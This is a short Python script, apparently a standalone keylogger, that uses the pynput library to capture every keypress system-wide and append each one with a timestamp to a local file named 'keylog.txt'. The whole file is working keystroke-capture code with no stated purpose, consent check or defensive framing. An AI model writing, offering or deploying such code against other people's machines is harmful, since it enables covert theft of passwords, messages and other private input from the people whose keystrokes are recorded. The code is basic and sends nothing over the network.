from pynput.keyboard import Listener
from datetime import datetime

log_file = "keylog.txt"

def on_press(key):
    time_stamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        with open(log_file, "a") as f:
            f.write(f"[{time_stamp}] {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{time_stamp}] [{key}]\n")

with Listener(on_press=on_press) as listener:
    listener.join()
